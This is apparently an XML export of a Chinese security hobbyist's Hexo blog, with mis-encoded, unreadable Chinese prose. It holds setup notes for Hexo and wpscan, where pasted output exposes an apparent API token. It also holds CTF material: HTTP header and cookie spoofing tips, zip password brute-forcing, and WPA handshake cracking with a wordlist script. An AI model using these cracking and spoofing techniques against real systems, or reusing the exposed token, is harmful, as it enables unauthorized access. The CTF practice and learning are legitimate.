<p>ç½‘ä¸Šæœ‰ä¸å°‘æ•™ç¨‹ï¼Œä½†åœ¨è¯´çš„ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œæœ‰çš„å› ä¸ºç‰ˆæœ¬ä¸åŒé€ æˆé…ç½®æ–‡ä»¶çš„ä¿®æ”¹ä¸ä¸€æ ·ï¼Œè¿™é‡Œå¯¹Next 5.0.1ç‰ˆæœ¬çš„é…ç½®åšä¸€äº›æ•´ç†ï¼Œæˆ–æ˜¯è¯´å¯¹æ•™ç¨‹ä¸­ä¸è¯¦ç»†çš„åœ°æ–¹åšä¸€äº›è¡¥å……ã€‚</p>
</blockquote>
</blockquote>
<p>ç”¨åˆ°èµ„æ–™ï¼š</p>
<ul>
<li><p><a href="http://blog.niices.com/Hexo-Next-Algolia-Search/">http://blog.niices.com/Hexo-Next-Algolia-Search/</a></p>
</li>
<li><p><a href="https://www.zhihu.com/question/46822587/answer/109403261">https://www.zhihu.com/question/46822587/answer/109403261</a></p>
</li>
<li><p><a href="https://github.com/iissnan/hexo-theme-next/issues/1084">https://github.com/iissnan/hexo-theme-next/issues/1084</a></p>
<p>â€‹    å¯¹äºæ³¨å†ŒAlgoliaå’Œè·å–ä¿¡æ¯å‚ç…§ç¬¬ä¸€æ¡å‚è€ƒé“¾æ¥ï¼Œæ³¨æ„å‘_config.ymlæ–‡ä»¶ä¸­æ·»åŠ é…ç½®ä¿¡æ¯æ—¶ï¼Œç¬¬ä¸€è¡Œalgoliaå‰é¢ä¸è¦æœ‰ç©ºæ ¼ï¼Œä¸ç„¶ä¼šæŠ¥é”™ï¼Œæˆ‘è¿™é‡Œåé¢è¿˜æœ‰ä¸€ä¸ªæŠ¥é”™æ˜¯<code>algolia async.js 61 fn=.....</code>ï¼Œå¦‚æœå‡ºç°è¿™ä¸ªæŠ¥é”™çš„è¯ï¼Œå»<code>\node_modules\bluebird\js\release</code>è·¯å¾„ä¸‹å»ä¿®æ”¹asygn.jsæ–‡ä»¶çš„ç¬¬61è¡Œã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170406/173529547.png" alt="mark"></p>
<p>è¿™æ˜¯æˆ‘åŸæœ¬çš„ç¬¬61è¡Œä»£ç ï¼š</p>
<pre><code>        fn = function () &#123; throw arg; &#125;;</code></pre>
<p>ä¿®æ”¹æˆï¼š</p>
<pre><code>        fn = function () &#123; throw new arg; &#125;;</code></pre>
<p>åˆ°è¿™é‡Œå°±å¯ä»¥æ­£å¸¸çš„æ‰§è¡Œä»¥ä¸‹å‘½ä»¤äº†ã€‚</p>
<pre><code>npm install hexo-algoliasearch --save
hexo algolia</code></pre>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170406/173601767.png" alt="mark"></p>
<p>apikey,appidä»€ä¹ˆçš„æŒ‰ç…§ç¬¬ä¸€ä¸ªæ•™ç¨‹æ¥å°±è¡Œï¼Œå¡«åˆ°é…ç½®æ–‡ä»¶çš„â€˜ â€™å†…å°±å¥½ã€‚</p>
<p>æ¥ä¸‹æ¥åœ¨ä¸»é¢˜é‡Œé¢çš„ _config.yml ä¸­ä¿®æ”¹</p>
<pre><code>algolia_search:
  enable: true</code></pre>
<p>â€‹    åˆ°è¿™ä¹‹åæˆ‘çš„åšå®¢ä¸­å·²ç»æœ‰æœç´¢å›¾æ ‡äº†ï¼Œä¹Ÿå¯ä»¥æœç´¢åˆ°æ–‡ç« äº†ï¼Œä½†ç‚¹å‡»æœç´ åˆ°çš„æ–‡ç« ä¸ä¼šè½¬åˆ°è¯¥æ–‡ç« ã€‚å»algoliaç½‘ç«™æŸ¥çœ‹ä¸€ä¸‹ï¼Œå‘ç°ä¸Šä¼ åˆ°æ•°æ®åº“çš„æ–‡ä»¶æœ‰ä¸ª<code>permalinkï¼šyoursite/./..</code>,å¾ˆæ˜æ˜¾è·³è½¬ä¸åˆ°æˆ‘çš„æ–‡ç« å•Šã€‚è¿™é‡Œåšå¦‚ä¸‹ä¿®æ”¹ï¼š</p>
<p>å»<code>node_modules/hexo-algolia/lib</code>ï¼Œ æ‰¾åˆ°<code>command.js</code>ï¼ŒåŠ <code>path</code>,å†ä¿®æ”¹æœ€åçš„permalinkå­—æ®µã€‚</p>
<p>ä¿®æ”¹å‰ï¼š</p>
<pre><code>var storedPost = _.pick(data, [&#39;title&#39;, &#39;date&#39;, &#39;slug&#39;, &#39;content&#39;, &#39;excerpt&#39;, &#39;permalink&#39;]); </code></pre>
<p>ä¿®æ”¹åï¼š</p>
<pre><code>var storedPost = _.pick(data, [&#39;title&#39;, &#39;date&#39;, &#39;slug&#39;, &#39;path&#39; , &#39;content&#39;, &#39;excerpt&#39;, &#39;objectID&#39;]);</code></pre>
<p>ç„¶åä¿®æ”¹ç«™ç‚¹çš„é…ç½®æ–‡ä»¶ï¼ˆå¤§çº¦åœ¨17è¡Œçš„ä½ç½®ï¼‰ï¼š</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170406/173225315.png" alt="mark"></p>
<p>ç„¶åå°±é…ç½®å®Œæˆäº†ã€‚</p>
<p>åœ¨é…ç½®æ–‡ä»¶å¯ä»¥æ›´æ”¹å¯¹åº”çš„æè¿°æ€§è¯­å¥ã€‚;ï¼‰</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170406/173416035.png" alt="mark"></p>
</li>
</ul>
]]></content>
      <categories>
        <category>other</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP-Headeræœ‰å…³çš„webé¢˜æ€è·¯</title>
    <url>/2017/04/23/http-header/</url>
    <content><![CDATA[<h1 id="HTTP-Headeræœ‰å…³çš„webé¢˜æ€è·¯"><a href="#HTTP-Headeræœ‰å…³çš„webé¢˜æ€è·¯" class="headerlink" title="HTTP-Headeræœ‰å…³çš„webé¢˜æ€è·¯"></a>HTTP-Headeræœ‰å…³çš„webé¢˜æ€è·¯</h1><p>1.æ”¹UA</p>
<p>User-Agentï¼šç”¨æˆ·ä»£ç†ï¼ˆæµè§ˆå™¨ä¿¡æ¯ï¼‰</p>
<blockquote>
<p><a href="http://blog.csdn.net/wer1234s/article/details/19028569">http://blog.csdn.net/wer1234s/article/details/19028569</a></p>
</blockquote>
<p>2.æ”¹Accept-Language</p>
<table>
<thead>
<tr>
<th align="center">è¯­è¨€ä»£ç </th>
<th align="center">è¯­è¨€åç§°</th>
</tr>
</thead>
<tbody><tr>
<td align="center">en-GB</td>
<td align="center">è‹±è¯­(è‹±å›½)</td>
</tr>
<tr>
<td align="center">en-US</td>
<td align="center">è‹±è¯­(ç¾å›½)</td>
</tr>
<tr>
<td align="center">ja-JP</td>
<td align="center">æ—¥è¯­</td>
</tr>
<tr>
<td align="center">ru-RU</td>
<td align="center">é³„é±¼</td>
</tr>
<tr>
<td align="center">zh-CN</td>
<td align="center">ä¸­æ–‡(ç®€ä½“)</td>
</tr>
<tr>
<td align="center">zh-HK</td>
<td align="center">ä¸­æ–‡(é¦™æ¸¯)</td>
</tr>
<tr>
<td align="center">zh-MO</td>
<td align="center">ä¸­æ–‡(æ¾³é—¨)</td>
</tr>
<tr>
<td align="center">zh-TW</td>
<td align="center">ä¸­æ–‡(ç¹ä½“)</td>
</tr>
</tbody></table>
<p><a href="http://www.lingoes.cn/zh/translator/langcode.htm">http://www.lingoes.cn/zh/translator/langcode.htm</a></p>
<p>3.Refereræ¥æºä¼ªé€ </p>
<blockquote>
<p><a href="https://zhidao.baidu.com/question/1832550088624773020.html">https://zhidao.baidu.com/question/1832550088624773020.html</a></p>
<p><a href="http://www.cnblogs.com/mx3000/archive/2007/12/17/1003239.html">http://www.cnblogs.com/mx3000/archive/2007/12/17/1003239.html</a></p>
</blockquote>
<p>4.XFFå¤´ï¼ˆipä¼ªé€ ï¼‰</p>
<p>X-Forwarded-Forï¼š ï¼Œåœ¨burpçš„headersé‡Œæ·»åŠ XFFå¤´å°±å¯ä»¥äº†ã€‚</p>
<p>5.cookieä¿®æ”¹</p>
<p>è®¾ç½®loginï¼1</p>
<p>6.httpè¯·æ±‚å¤´æˆ–å“åº”å¤´æœ‰flag</p>
<p>7.è®¾ç½®äº†302è·³è½¬çš„ç½‘é¡µä¸­æœ‰flag</p>
]]></content>
      <tags>
        <tag>websec</tag>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexoç‰ˆæœ¬å‡çº§æŒ‡å—</title>
    <url>/2020/02/16/hexo-ban-ben-sheng-ji/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ›´æ¢äº†æ–°ä¸»é¢˜ï¼Œåœ¨hexo gå’Œhexo sçš„æ—¶å€™æ€»ä¼šæŠ¥å¦‚ä¸‹é”™è¯¯ï¼Œåœ¨ä¸»é¢˜github issuesé€›äº†ä¸€åœˆåï¼Œæ„Ÿè§‰åº”è¯¥æ˜¯æˆ‘çš„hexoç‰ˆæœ¬å¤ªè€äº†ã€‚</p>
<pre><code>âœ hexo s
(node:64285) [DEP0061] DeprecationWarning: fs.SyncWriteStream is deprecated.
INFO  Start processing
ERROR Process failed: layout/archive.ejs
SyntaxError: Invalid or unexpected token in &quot;/Users/lanvnal/Files/blog/themes/hexo-theme-matery/layout/archive.ejs&quot;
    at new Function (&lt;anonymous&gt;)
    at Object.exports.compile (/Users/lanvnal/Files/blog/node_modules/ejs/lib/ejs.js:242:14)
    at Function.ejsRenderer.compile (/Users/lanvnal/Files/blog/node_modules/hexo-renderer-ejs/lib/renderer.js:11:14)
    at Theme._View.View.View._precompile (/Users/lanvnal/Files/blog/node_modules/hexo/lib/theme/view.js:117:31)</code></pre>
<p>å†³å®šå‡çº§hexoç‰ˆæœ¬ï¼Œä½†æ˜¯æ²¡æ‰¾åˆ°å¾ˆæ˜ç¡®çš„å‡çº§hexoçš„æ–‡ç« ï¼Œé‚åšä¸€ä¸‹è®°å½•ã€‚</p>
<h2 id="å‡çº§"><a href="#å‡çº§" class="headerlink" title="å‡çº§"></a>å‡çº§</h2><p>1ã€å…¨å±€å‡çº§hexo-cliï¼Œå…ˆ<code>hexo version</code>æŸ¥çœ‹å½“å‰ç‰ˆæœ¬ï¼Œç„¶å<code>npm i hexo-cli -g</code>ï¼Œå†æ¬¡<code>hexo version</code>æŸ¥çœ‹æ˜¯å¦å‡çº§æˆåŠŸã€‚</p>
<p>2ã€ä½¿ç”¨<code>npm install -g npm-check</code>å’Œ<code>npm-check</code>ï¼Œæ£€æŸ¥ç³»ç»Ÿä¸­çš„æ’ä»¶æ˜¯å¦æœ‰å‡çº§çš„ï¼Œå¯ä»¥çœ‹åˆ°è‡ªå·±å‰é¢éƒ½å®‰è£…äº†é‚£äº›æ’ä»¶</p>
<p>3ã€ä½¿ç”¨<code>npm install -g npm-upgrade</code>å’Œ<code>npm-upgrade</code>ï¼Œå‡çº§ç³»ç»Ÿä¸­çš„æ’ä»¶</p>
<p>4ã€ä½¿ç”¨<code>npm update -g</code>å’Œ<code>npm update --save</code></p>
<p>PSï¼šç¬¬å››æ­¥é‡åˆ°äº†é”™è¯¯ï¼Œé”™è¯¯æç¤ºå¦‚ä¸‹ï¼š</p>
<pre><code>&gt; fsevents@1.2.11 install /Users/lanvnal/Files/blog/node_modules/hexo/node_modules/fsevents
&gt; node-gyp rebuild

xcode-select: error: tool &#39;xcodebuild&#39; requires Xcode, but active developer directory &#39;/Library/Developer/CommandLineTools&#39; is a command line tools instance

xcode-select: error: tool &#39;xcodebuild&#39; requires Xcode, but active developer directory &#39;/Library/Developer/CommandLineTools&#39; is a command line tools instance

No receipt for &#39;com.apple.pkg.CLTools_Executables&#39; found at &#39;/&#39;.

No receipt for &#39;com.apple.pkg.DeveloperToolsCLILeo&#39; found at &#39;/&#39;.

No receipt for &#39;com.apple.pkg.DeveloperToolsCLI&#39; found at &#39;/&#39;.
gyp: No Xcode or CLT version detected!</code></pre>
<p>å…¶å®å·²ç»å®‰è£…è¿‡äº†xcode cliï¼Œä½†æ˜¯è¿™é‡Œè¿˜æ˜¯æŠ¥é”™äº†ï¼Œä¼°è®¡å’Œè‹¹æœæ–°ç³»ç»Ÿæœ‰å…³ï¼Œé‡è£…å°±å¥½äº†ï¼Œæ“ä½œå¦‚ä¸‹ï¼š</p>
<p>å¦‚æœåƒä»¥å‰ä¸€æ ·æ‰§è¡Œ<code>xcode-select --install</code>ä¼šæœ‰å¦‚ä¸‹æŠ¥é”™ï¼š</p>
<pre><code>xcode-select: error: command line tools are already installed, use &quot;Software Update&quot; to install updates</code></pre>
<p>è§£å†³åŠæ³•ï¼š</p>
<pre><code>sudo rm -rf /Library/Developer/CommandLineTools
xcode-select --install</code></pre>
<p>ç„¶åå†æ‰§è¡Œç¬¬å››æ­¥ï¼Œå®Œç¾å‡çº§ã€‚</p>
]]></content>
      <categories>
        <category>other</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Macä¸‹Brewå®‰è£…çš„wpscanæ— æ³•æ›´æ–°çš„é—®é¢˜</title>
    <url>/2020/02/07/mac-xia-brew-an-zhuang-de-wpscan-wu-fa-geng-xin-de-wen-ti/</url>
    <content><![CDATA[<h2 id="é‡åˆ°çš„é—®é¢˜"><a href="#é‡åˆ°çš„é—®é¢˜" class="headerlink" title="é‡åˆ°çš„é—®é¢˜"></a>é‡åˆ°çš„é—®é¢˜</h2><p>Macä¸‹ä½¿ç”¨HomeBrewå®‰è£…æœ€æ–°çš„wpscanï¼Œåœ¨wpscanæ›´æ–°æ•°æ®åº“æ—¶å‘ç”Ÿé”™è¯¯ã€‚</p>
<pre><code class="shell">âœ ./wpscan --update
cli_options:
  api_token: pTBhWI3kRUbP8KV3vD6nCtpDussLs9dwYX7bvCSahwQ
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
cli_options:
                       Version 2.9.4
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[i] Updating the Database ...

[!] Unable to get https://data.wpscan.org/local_vulnerable_files.xml.sha512 (status: 403)</code></pre>
<p>curlç»“æœï¼š</p>
<pre><code>âœ curl https://data.wpscan.org/local_vulnerable_files.xml.sha512
error code: 1020%</code></pre>
<h2 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h2><p>åº”è¯¥æ˜¯ç‰ˆæœ¬å¤ªè€çš„åŸå› ï¼Œæœ€æ–°ç‰ˆæœ¬å·²ç»æ˜¯3.7.7äº†ï¼Œä½†æ˜¯brewçš„æ²¡æœ‰åŠæ—¶æ›´æ–°ã€‚<br>å»GitHubçš„wpscané¡¹ç›®cloneæœ€æ–°æºç ï¼Œè‡ªè¡Œç¼–è¯‘å°±å¥½ã€‚</p>
<pre><code>âœ git clone https://github.com/wpscanteam/wpscan
âœ cd wpscan
âœ bundle install &amp;&amp; rake install</code></pre>
<blockquote>
<p>ç½‘ç»œé—®é¢˜å¯ä»£ç†è§£å†³ã€‚</p>
</blockquote>
<p>ä½¿ç”¨ä¸Šçš„é—®é¢˜ï¼š<br>ç°åœ¨ä½¿ç”¨wpscanéœ€è¦ä½¿ç”¨å®˜æ–¹çš„api-tokenï¼Œè¿™ä¸ªå¯ä»¥è‡ªå·±æ³¨å†Œä¸€ä¸ªå…è´¹çš„è´¦å·ï¼Œæ¯æ—¥50ä½¿ç”¨æ¬¡æ•°ã€‚<br><a href="https://wpvulndb.com/users/choose_plan">æ³¨å†Œåœ°å€</a></p>
<p>ä¸ºäº†æ–¹ä¾¿ä½¿ç”¨ï¼Œå¯ä»¥å°†api-tokenä¿å­˜åœ¨æ–‡ä»¶ä¸­<br>åœ¨<code>~/.wpscan/scan.yml</code>æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p>
<pre><code>cli_options:
  api_token: YOUR_API_TOKEN</code></pre>
]]></content>
      <categories>
        <category>other</category>
      </categories>
      <tags>
        <tag>Mac</tag>
        <tag>wpscan</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCC-WriteUp</title>
    <url>/2017/05/02/iscc-writeup/</url>
    <content><![CDATA[<h1 id="ISCC-WriteUp"><a href="#ISCC-WriteUp" class="headerlink" title="ISCC-WriteUp"></a>ISCC-WriteUp</h1><h2 id="0X01-Basic"><a href="#0X01-Basic" class="headerlink" title="0X01 Basic"></a>0X01 Basic</h2><p>1.Wheel Cipherï¼ˆ50ï¼‰</p>
<p>Jefferson diskï¼ˆæ°å¼—é€Šç›˜ï¼‰ï¼ŒæŸ¥çœ‹<a href="https://www.wikiwand.com/en/Jefferson_disk">wiki</a>å…¶åŠ å¯†æ–¹æ³•ã€‚</p>
<p>å…³é”®éƒ¨åˆ†æ‘˜å½•ä¸‹æ¥ã€‚</p>
<pre><code>Operation
To encrypt a message, Alice rotates the disks to produce the plaintext message along one &quot;row&quot; of the stack of disks, and then selects another row as the ciphertext. To decrypt the message, Bob rotates the disks on his cylinder to produce the ciphertext along a row. It is handy if both Alice and Bob know the offset of the row, but not really necessary since Bob can simply look around the cylinder to find a row that makes sense.

For example, a simplified &quot;toy&quot; Bazeries cylinder using only ten disks might be organised as shown below, with each disk &quot;unwrapped&quot; into a line and each marked with a designating number:

1:    &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;
2:    &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;
3:    &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;
4:    &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;
5:    &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;
6:    &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;
7:    &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;
8:    &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;
9:    &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;
10:    &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;
If the &quot;key&quot;, the sequence of disks, for this Bazeries cylinder is

7,9,5,10,1,6,3,8,2,4
and Alice wants to send the message &quot;retreat now&quot; to Bob, she rearranges the disks as per the key and rotates each disk to obtain the plaintext, which is shown at the left, with spacing added for clarity:

7:    &lt; R AFDCE O NJQGWTHSPYBXIZULVKM &lt;
9:    &lt; E NYVUB M CQWAOIKZGJXPLTDSRFH &lt;
5:    &lt; T SGJVD K CPMNZQWXYIHFRLABEUO &lt;
10:    &lt; R SCZQK E LMXYIHPUDNAJFBOWTGV &lt;
1:    &lt; E ZWAXJ G DLUBVIQHKYPNTCRMOSF &lt;
6:    &lt; A MKGHI W PNYCJBFZDRUSLOQXVET &lt;
3:    &lt; T EQGYX P LOCKBDMAIZVRNSJUWFH &lt;
8:    &lt; N OZUTW D CVRJLXKISEFAPMYGHBQ &lt;
2:    &lt; O YHGVS F UWIKPBELNACZDTRXMJQ &lt;
4:    &lt; W AORPL N DVHGFCUKTEBSXQYIZMJ &lt;
She then selects the ciphertext from the sixth row of the cylinder up from the plaintext. This ciphertext is also highlighted above with spacing, and gives:

OMKEGWPDFN
When Bob gets the ciphertext, he rearranges the disks on his cylinder to the key arrangement, rotates the disks to give the ciphertext, and then reads the plaintext six rows down from the ciphertext, or simply looks over the cylinder for a row that makes sense.</code></pre>
<p>ç®€è¿°ä¸€ä¸‹è§£å¯†çš„æ–¹æ³•ï¼š</p>
<blockquote>
<p>ç»™å‡ºäº†åŠ å¯†è¡¨ï¼Œå¯†åŒ™å’Œå¯†æ–‡ã€‚</p>
<p>1.å°†åŠ å¯†è¡¨æ ¹æ®å¯†åŒ™çš„æ•°å­—é¡ºåºæ’åºã€‚</p>
<p>2.æ¯ä¸€è¡Œç›¸å½“äºä¸€ä¸ªæ»šè½®ï¼Œå­—æ¯æ˜¯ç¯å½¢é¦–å°¾ç›¸æ¥æ’åˆ—çš„ï¼ŒæŒ‰ç…§å¯†æ–‡å°†åŠ å¯†è¡¨æ¯ä¸€è¡Œé‡æ–°æ’åˆ—ï¼Œä½¿ç¬¬ä¸€ä¸ªå­—æ¯ç¬¦åˆå¯†æ–‡ï¼Œæ’åˆ—æ—¶å½“ä½œä¸€ä¸ªç¯è¿›è¡Œæ’åˆ—ã€‚</p>
<p>3.æ’å¥½åæŒ‰åˆ—è¯»å‡ºï¼Œçœ‹çœ‹å“ªåˆ—æˆå¥å­ã€‚</p>
</blockquote>
<pre><code>åŠ å¯†è¡¨ï¼š
1:    &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;
2:    &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;
3:    &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;
4:    &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;
5:    &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;
6:    &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;
7:    &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;
8:    &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;
9:    &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;
10:    &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;
11ï¼š    &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;
12ï¼š    &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;
13ï¼š    &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;

å¯†é’¥ä¸ºï¼š2ï¼Œ3ï¼Œ7ï¼Œ5ï¼Œ13,12,9ï¼Œ1ï¼Œ8ï¼Œ10ï¼Œ4ï¼Œ11ï¼Œ6
å¯†æ–‡ä¸ºï¼šNFQKSEVOQOFNP

2:    &lt; N ACZDTRXMJQOYHGVS FUWIKPBEL &lt;
3:    &lt; F HTEQGYXPLOCKBDMA IZVRNSJUW &lt;
7:    &lt; Q GWTHSPYBXIZULVKM RAFDCEONJ &lt;
5:    &lt; K CPMNZQWXYIHFRLAB EUOTSGJVD &lt;
13ï¼š    &lt; S XCDERFVBGTYHNUMK ILOPJZQAW &lt;
12ï¼š    &lt; E IURYTASBKJDFHGLV NCMXZPQOW &lt;
9:    &lt; V UBMCQWAOIKZGJXPL TDSRFHENY &lt;
1:    &lt; O SFEZWAXJGDLUBVIQ HKYPNTCRM &lt;
8:    &lt; Q NOZUTWDCVRJLXKIS EFAPMYGHB &lt;
10:    &lt; O WTGVRSCZQKELMXYI HPUDNAJFB &lt;
4:    &lt; F CUKTEBSXQYIZMJWA ORPLNDVHG &lt;
11ï¼š    &lt; N BVCXZQWERTPOIUYA LSKDJFHGM &lt;
6:    &lt; P NYCJBFZDRUSLOQXV ETAMKGHIW &lt;

--&gt;FIREINTHEHOLE</code></pre>
<p>2.ç¥ç§˜å›¾ç‰‡ï¼ˆ100ï¼‰</p>
<p>ä¸‹è½½é™„ä»¶æ˜¯ä¸€pngæ ¼å¼å›¾ç‰‡<a href="http://omfp4wyym.bkt.clouddn.com/blog/20170502/002753940.png">ä¸‹è½½</a></p>
<p>æ”¾åˆ°pngcheckçœ‹ä¸€ä¸‹ï¼Œå‘ç°IENDå—é‡Œæœ‰ä¸œè¥¿ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170502/002916852.png" alt="mark"></p>
<p>ç”¨foremostè¿›è¡Œæ¢å¤ã€‚</p>
<p>æ‰§è¡Œ<code>foremost -v 1.png</code>,æ–‡ä»¶ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶å¤¹ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170502/003243173.png" alt="mark"></p>
<p>æŸ¥çœ‹æ¢å¤å‡ºæ¥çš„å›¾ç‰‡ã€‚</p>
<p>å‘ç°é‡Œé¢æœ‰ä¸ªè¿™ä¸ªï¼Œæ˜¯çŒªåœˆå¯†ç ã€‚<a href="http://haojiawei.xyz/2017/02/08/%E7%8C%AA%E5%9C%88%E5%AF%86%E7%A0%81/">çŒªåœˆå¯†ç </a></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170502/003401527.png" alt="mark"></p>
<p>è§£å¾—-goodluckã€‚</p>
<p>3.å‘Šè¯‰ä½ ä¸ªç§˜å¯†ï¼ˆ100ï¼‰</p>
<pre><code>636A56355279427363446C4A49454A7154534230526D6843
56445A31614342354E326C4B4946467A5769426961453067

-----------------------------------------------------
16è¿›åˆ¶è½¬å­—ç¬¦
cjV5RyBscDlJIEJqTSB0RmhC
VDZ1aCB5N2lKIFFzWiBiaE0g
-------------------------------------------------------
è§£base64
r5yG lp9I BjM tFhB
T6uh y7iJ QsZ bhM 
---------------------------
tongyuan</code></pre>
<p>4.ä½ çŒœçŒœï¼ˆ100ï¼‰</p>
<p>ä¸‹è½½å¾—</p>
<pre><code>504B03040A0001080000626D0A49F4B5091F1E0000001200000008000000666C61672E7478746C9F170D35D0A45826A03E161FB96870EDDFC7C89A11862F9199B4CD78E7504B01023F000A0001080000626D0A49F4B5091F1E00000012000000080024000000000000002000000000000000666C61672E7478740A0020000000000001001800AF150210CAF2D1015CAEAA05CAF2D1015CAEAA05CAF2D101504B050600000000010001005A000000440000000000</code></pre>
<p>çœ‹åˆ°504Båº”è¯¥å°±çŸ¥é“æ˜¯æ€ä¹ˆå›äº‹äº†ï¼Œè¿™æ˜¯ä¸€ä¸ªzipæ–‡ä»¶çš„16è¿›åˆ¶æ•°æ®ã€‚</p>
<p>16è¿›åˆ¶ç¼–è¾‘ä¿å­˜ä¸ºzipæ–‡ä»¶ï¼Œæ‰“å¼€å‘ç°flag.txtè¢«åŠ å¯†ï¼Œå°è¯•ä¼ªåŠ å¯†æ— æœï¼Œè½¬è€Œçˆ†ç ´ï¼Œå¾—keyï¼š123456ï¼Œå¾—flagã€‚</p>
<p>5.å…¬é‚®å¯†ç ï¼ˆ100ï¼‰</p>
<p>ä¸‹è½½å¾—ä¸€ä¸ªåŠ å¯†çš„zipæ–‡ä»¶ï¼Œçˆ†ç ´å¾—åˆ°å¯†ç ï¼Œè¾“å…¥å¯†ç å¾—åˆ°base64åŠ å¯†è¿‡çš„flagï¼Œè§£å¯†å³å¯ã€‚</p>
<p>6.äºŒç»´ç ï¼ˆ150ï¼‰</p>
<p>â€‹    ä¸‹è½½æ˜¯ä¸€ä¸ªäºŒç»´ç ï¼Œå†…å®¹æ˜¯<code>The password of the router is our flag</code>è¯´flagåœ¨è·¯ç”±å™¨é‡Œã€‚æ”¹ä¸ºzipï¼Œå†…å®¹è¢«åŠ å¯†ï¼Œæ–‡ä»¶åæ¯”è¾ƒä¸åŒ<code>u5bc6u7801u7eafu6570u5b57u5171u0038u4f4d</code>ï¼Œæ˜¯Unicodeç¼–ç ï¼Œè§£ç åå‘Šè¯‰æˆ‘ä»¬å¯†ç çº¯æ•°å­—å…±8ä½ã€‚çˆ†ç ´å¾—å¯†ç ä¸º20161114.</p>
<p>â€‹    è§£å‹ååˆç»™å‡ºäº†å¯†ç æç¤ºå’Œä¸€ä¸ª.capçš„æ–‡ä»¶ï¼Œç”¨<a href="http://baike.baidu.com/link?url=UZsZItyiU4vTIpjxtz3wK3nGgLu22w-XIvKCkFGQ1LvwN_UziKZtAFzOFVDUfScM_zlZTB1NHAT0wGZu3H1DDq">EWSA</a>çˆ†ç ´ã€‚æ ¹æ®æç¤º<code>å‰å››ä½æ˜¯ISCC åå››ä½ç”±å¤§å†™å­—æ¯å’Œæ•°å­—æ„æˆ</code>ï¼Œå†™å‡ºå­—å…¸ã€‚</p>
<pre><code>s=&#39;1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#39;
ss=&#39;ISCC&#39;
flag=open(&#39;1.txt&#39;,&#39;w&#39;)
for a in s:
    for b in s:
        for c in s:
            for d in s:
                key=ss+a+b+c+d
                flag.write(key)
                flag.write(&#39;\n&#39;)
flag.close()
</code></pre>
<p>çˆ†ç ´å¾—å¯†ç å³flag.</p>
<h2 id="0X02-Misc"><a href="#0X02-Misc" class="headerlink" title="0X02 Misc"></a>0X02 Misc</h2><p>1.çœ¼è§éå®ï¼ˆ100ï¼‰</p>
<p>ä¸‹è½½çš„æ˜¯ä¸€ä¸ªwordæ–‡æ¡£ï¼Œå‡ºé”™æ‰“ä¸å¼€ã€‚æ”¹ä¸€ä¸‹åç¼€è§£å‹å‡ºæ¥ï¼Œåœ¨document.xmlæ–‡ä»¶ä¸­æœ‰flagã€‚</p>
<p>2.æ™®é€šDiscoï¼ˆ250ï¼‰</p>
<p>ä¸‹è½½æ˜¯ä¸€ä¸ªdisco.wavæ–‡ä»¶ï¼Œé¢‘è°±åˆ†æï¼Œå¼€å¤´ä¸€æ®µåˆä¸œè¥¿ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170520/113052128.png" alt="mark"></p>
<p>é«˜ä½ä½å¯¹åº”01ï¼Œç„¶åäºŒè¿›åˆ¶è½¬åè¿›åˆ¶ï¼Œå†è½¬å­—ç¬¦ã€‚</p>
<pre><code>1100110    102
1101100    108
1100001    97
1100111    103
1111011    123
1010111    87
0110000    48
1010111    87
0101010    42
1100110    102
1110101    117
1101110    110
1101110    110
1111001    121
1111101    125

flag&#123;W0W*funny&#125;</code></pre>
